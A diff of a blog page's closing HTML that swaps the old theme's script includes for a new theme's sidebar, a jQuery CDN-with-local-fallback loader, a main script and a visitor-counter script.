+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "bak6ry"
+    }
 </script>
-
-
-
-
-
-
-
-
-
-  
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-  
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
-   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
-   
-   <!-- 页面点击小红心 -->
-<script type="text/javascript" src="/js/src/love.js"></script>
-
-</body>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+     
+    </body>
 </html>
+
+
